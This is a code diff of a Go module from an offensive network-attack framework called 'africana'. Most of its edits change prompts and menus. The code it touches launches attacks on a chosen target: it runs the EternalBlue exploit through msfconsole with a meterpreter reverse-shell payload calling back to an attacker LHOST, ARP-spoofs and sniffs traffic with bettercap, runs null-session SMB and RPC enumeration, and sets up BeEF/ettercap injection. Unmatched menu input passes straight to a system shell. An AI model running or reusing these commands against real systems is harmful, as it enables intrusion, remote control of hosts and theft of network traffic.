@@ -29,8 +29,8 @@ var(
 func InternalScan() {
     fmt.Println()
     subprocess.Popen(`ip address`)
-    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
-    fmt.Printf(bcolors.BLUE + "\n╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+    fmt.Println()
+    fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " networks(" + bcolors.RED + "src/internals/set_iface/default_eth0.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
     scanner.Scan()
     userIface := scanner.Text()
     if userIface == "" {
@@ -49,43 +49,50 @@ func NmapPortScan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "Port scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
     //subprocess.Popen(`masscan -v %s --ports 0-65535 --rate 10000 --wait 0`, userTarget)
     fmt.Println()
-    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -Pn -p- %s`, userTarget)
+    subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, userTarget)
+    fmt.Println()
     return
 }
 
 func NmapVulnScan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "Vuln scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`nmap --open -v -T4 -Pn -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget)
+    subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget)
+    fmt.Println()
     return
 }
 
 func SmbVulnScan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB vuln scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
-    subprocess.Popen(`nmap -sV -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget)
+    subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, userTarget)
+    fmt.Println()
     return
 }
 
 func Enum4linux(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
     subprocess.Popen(`cd /root/.africana/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, userTarget)
+    fmt.Println()
     return
 }
 
 func EnumNxc(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
     subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`, userTarget)
+    fmt.Println()
     return
 }
 
 func SmbMapScan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "SMB recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
     subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, userTarget, userTarget)
+    fmt.Println()
     return
 }
 
 func RpcEnumScan(userTarget string) {
     fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing" + bcolors.ENDC + ": " + bcolors.DARKGREEN + "RPC recon scan " + bcolors.PURPLE + "Target " + bcolors.ENDC + "= " + bcolors.ORANGE + "%s 🐾\n" + bcolors.ENDC, userTarget)
     subprocess.Popen(`rpcclient -U "" -N %s`, userTarget)
+    fmt.Println()
     return
 }
 
@@ -97,13 +104,12 @@ func SmbExploit(userTarget string) {
     }
     menus.MenuThreeOne()
     for {
-        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+        fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " networks(" + bcolors.RED +  "src/internals/launch_smb_exploit.fn" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
         scanner.Scan()
         userInput := scanner.Text()
         switch strings.ToLower(userInput) {
         case "banner":
-            banners.Banner()
+            banners.RandomBanners()
         case "sleep":
             utils.Sleep()
         case "v", "version":
@@ -142,27 +148,31 @@ func SmbExploit(userTarget string) {
             menus.HelpInfoList()
         case "? start", "info start", "help start", "start":
             menus.HelpInfoStart()
-
+        case "? options", "info options", "help options":
+            menus.HelpInfOptions()
         case "list all", "list modules", "show modules", "show all", "modules":
             menus.HelpInfoExplScan()
         case "1":
             fmt.Println()
             subprocess.Popen(`ip address`)
-            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN+ "lhost " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " networks(" + bcolors.RED +  "src/internals/set_LHOST_default/%s", userLhostIp + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
             scanner.Scan()
             userLhost := scanner.Text()
             if userLhost == "" {
                 userLhost = userLhostIp
             }
-            fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.GREEN + "lport " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + bcolors.ITALIC + ")" + bcolors.ENDC)
-        fmt.Printf(bcolors.BLUE + "\n╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Printf(`LHOST => %s`, userLhostIp)
+            fmt.Println()
+            fmt.Printf(bcolors.UNDERL + bcolors.BOLD + "afr3" + bcolors.ENDC + " networks(" + bcolors.RED +  "src/internals/set_LPORT_default/9999" + bcolors.ENDC + ")" + bcolors.GREEN + " ❯ " + bcolors.ENDC)
             scanner.Scan()
             userLport := scanner.Text()
             if userLport == "" {
                 userLport = "9999"
             }
-            subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
+            fmt.Printf(`LPORT => %s`, userLport)
+            fmt.Println()
+            subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
         default:
             utils.SystemShell(userInput)
         }
@@ -180,7 +190,7 @@ func PacketSniffer(userTarget string) {
         }
         switch strings.ToLower(userInput) {
         case "banner":
-            banners.Banner()
+            banners.RandomBanners()
         case "sleep":
             utils.Sleep()
         case "v", "version":
@@ -219,9 +229,11 @@ func PacketSniffer(userTarget string) {
             menus.HelpInfoList()
         case "? start", "info start", "help start", "start":
             menus.HelpInfoStart()
-
+         case "? options", "info options", "help options":
+            menus.HelpInfOptions()
         case "list all", "list modules", "show modules", "show all", "modules":
             menus.HelpInfoPsniffer()
+
         case "1":
             subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget)
         case "2":
@@ -285,7 +297,7 @@ func BeefEttercap(userTarget string) {
     userInput := scanner.Text()
     switch strings.ToLower(userInput) {
     case "banner":
-            banners.Banner()
+            banners.RandomBanners()
     case "sleep":
         utils.Sleep()
     case "v", "version":
@@ -324,9 +336,9 @@ func BeefEttercap(userTarget string) {
         menus.HelpInfoList()
     case "? start", "info start", "help start", "start":
         menus.HelpInfoStart()
-
     case "list all", "list modules", "show modules", "show all", "modules":
         menus.HelpInfoBeefNinja()
+
     case "1":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
@@ -553,7 +565,7 @@ func BeefBettercap(userTarget string) {
     userInput := scanner.Text()
     switch strings.ToLower(userInput) {
     case "banner":
-        banners.Banner()
+        banners.RandomBanners()
     case "sleep":
         utils.Sleep()
     case "v", "version":
@@ -592,9 +604,9 @@ func BeefBettercap(userTarget string) {
         menus.HelpInfoList()
     case "? start", "info start", "help start", "start":
         menus.HelpInfoStart()
-
     case "list all", "list modules", "show modules", "show all", "modules":
         menus.HelpInfoBeefNinja()
+
     case "1":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(filePath); os.IsNotExist(err) {
@@ -757,7 +769,7 @@ func BeefInjector(userTarget string) {
          }
         switch strings.ToLower(userInput) {
         case "banner":
-            banners.Banner()
+            banners.RandomBanners()
         case "sleep":
             utils.Sleep()
         case "v", "version":
@@ -796,8 +808,10 @@ func BeefInjector(userTarget string) {
             menus.HelpInfoList()
         case "? start", "info start", "help start", "start":
             menus.HelpInfoStart()
-
+        case "? options", "info options", "help options":
+            menus.HelpInfOptions()
         case "list all", "list modules", "show modules", "show all", "modules":
+
             menus.HelpInfoBeefNinja()
         case "1":
             BeefEttercap(userTarget)
